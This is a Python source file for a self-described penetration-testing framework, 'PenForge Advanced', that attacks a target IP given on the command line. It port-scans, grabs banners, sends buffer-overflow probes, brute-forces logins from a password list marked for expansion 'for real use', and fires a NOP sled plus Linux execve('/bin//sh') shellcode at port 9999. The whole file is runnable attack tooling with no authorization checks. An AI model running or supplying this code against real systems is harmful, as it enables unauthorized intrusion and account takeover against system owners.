import socket
import threading
import queue
import argparse
import sys
from typing import List, Dict
import re
import time

class PenForgeAdvanced:
    def __init__(self, target: str, ports: List[int]):
        self.target = target
        self.ports = ports
        self.plugins = []
        self.exploit_chains = {}
        self.results = queue.Queue()
        self.lock = threading.Lock()

    def register_plugin(self, plugin):
        self.plugins.append(plugin)

    def add_exploit_chain(self, port: int, exploits: List[callable]):
        self.exploit_chains[port] = exploits

    def scan_port(self, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target, port))
            sock.close()
            return result == 0
        except Exception as e:
            with self.lock:
                print(f"[ERROR] Scan failed on port {port}: {e}")
            return False

    def run_plugins_on_port(self, port: int):
        threads = []
        for plugin in self.plugins:
            thread = threading.Thread(target=plugin.run, args=(self.target, port, self.results))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()

    def run_exploit_chain_on_port(self, port: int):
        if port in self.exploit_chains:
            for exploit in self.exploit_chains[port]:
                try:
                    exploit(self.target, port, self.results)
                except Exception as e:
                    self.results.put(f"[ERROR] Exploit failed on {port}: {e}")

    def execute(self):
        scan_threads = []
        for port in self.ports:
            thread = threading.Thread(target=self._scan_and_exploit, args=(port,))
            scan_threads.append(thread)
            thread.start()
        for thread in scan_threads:
            thread.join()
        while not self.results.empty():
            print(self.results.get())

    def _scan_and_exploit(self, port: int):
        print(f"[INFO] Scanning {self.target}:{port}")
        if self.scan_port(port):
            print(f"[SUCCESS] Port {port} is open")
            self.run_plugins_on_port(port)
            self.run_exploit_chain_on_port(port)
        else:
            print(f"[INFO] Port {port} is closed")

class PluginBase:
    def run(self, target: str, port: int, results: queue.Queue):
        raise NotImplementedError("Plugin must implement run method")

class BannerGrabPlugin(PluginBase):
    def run(self, target: str, port: int, results: queue.Queue):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            results.put(f"[INFO] Banner from {target}:{port}: {banner[:100]}...")
            sock.close()
        except Exception as e:
            results.put(f"[ERROR] Banner grab failed: {e}")

class BufferOverflowPlugin(PluginBase):
    def run(self, target: str, port: int, results: queue.Queue):
        try:
            payload = b"A" * 1500 + b"\x90\x90\x90\x90" + b"\xDE\xAD\xBE\xEF"
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.send(payload)
            response = sock.recv(1024)
            if b"crash" in response.lower() or len(response) == 0:
                results.put(f"[VULN] Potential buffer overflow on {target}:{port}")
            else:
                results.put(f"[INFO] No buffer overflow detected on {target}:{port}")
            sock.close()
        except Exception as e:
            results.put(f"[ERROR] Buffer overflow check failed: {e}")

class BruteForcePlugin(PluginBase):
    def run(self, target: str, port: int, results: queue.Queue):
        passwords = ["admin", "password", "123456", "letmein"]  # Example wordlist; expand for real use
        try:
            for pwd in passwords:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                sock.send(f"LOGIN user:{pwd}\r\n".encode())
                response = sock.recv(1024).decode('utf-8')
                if "success" in response.lower():
                    results.put(f"[VULN] Brute-force success on {target}:{port} with password: {pwd}")
                    sock.close()
                    return
                sock.close()
                time.sleep(0.5)  # Rate limiting
            results.put(f"[INFO] No brute-force success on {target}:{port}")
        except Exception as e:
            results.put(f"[ERROR] Brute-force failed: {e}")

def custom_shell_exploit(target: str, port: int, results: queue.Queue):
    try:
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        payload = b"B" * 1000 + b"\x90" * 100 + shellcode
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        sock.send(payload)
        results.put(f"[INFO] Custom shellcode sent to {target}:{port}; check for shell")
        sock.close()
    except Exception as e:
        results.put(f"[ERROR] Shell exploit failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="PenForge Advanced: Enhanced Penetration Testing Framework")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--ports", required=True, help="Comma-separated ports (e.g., 80,443,9999)")
    args = parser.parse_args()

    ports = [int(p.strip()) for p in args.ports.split(',')]
    framework = PenForgeAdvanced(args.target, ports)
    framework.register_plugin(BannerGrabPlugin())
    framework.register_plugin(BufferOverflowPlugin())
    framework.register_plugin(BruteForcePlugin())
    framework.add_exploit_chain(9999, [custom_shell_exploit])  # Example chain for port 9999
    framework.execute()

if __name__ == "__main__":
    main()
